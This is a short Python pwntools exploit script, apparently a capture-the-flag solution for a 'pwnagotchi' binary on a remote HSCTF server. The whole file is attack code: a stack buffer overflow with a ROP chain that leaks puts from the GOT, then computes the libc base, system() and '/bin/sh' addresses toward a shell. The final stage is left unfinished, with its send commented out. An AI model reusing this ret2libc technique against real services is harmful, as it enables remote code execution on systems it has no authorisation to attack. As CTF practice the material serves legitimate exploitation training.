from pwn import *

offset = 20

puts_plt = 0x400660
puts_got = 0x601018
main_plt = 0x400846
pop_rdi = 0x4009f3

once = 0x601099
gets_plt = 0x4006b0

r = remote('pwn.hsctf.com', 5005)
#r = process('./pwnagotchi')
r.recvuntil('name:')

payload = ""
payload += "A"*offset
payload += p64(pop_rdi)
payload += p64(once)
payload += p64(gets_plt)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

r.sendline(payload)
r.sendline(p64(0x0))

r.recvuntil('happy!')
r.recvline()
leak = u64(r.recvline().strip().ljust(8,'\x00'))
libc_base = leak - 0x0809c0
system_addr = libc_base + 0x04f440
shell_addr = libc_base + 0x1b3e9a

log.info("puts leak: {}".format(hex(leak)))
log.info("libc base: {}".format(hex(libc_base)))
log.info("system() addr: {}".format(hex(system_addr)))
log.info("/bin/sh addr: {}".format(hex(shell_addr)))


r.recvuntil('name:')

payload = ""
payload += "A"*offset
payload += p64(main_plt)

#r.sendline(payload)
r.interactive()
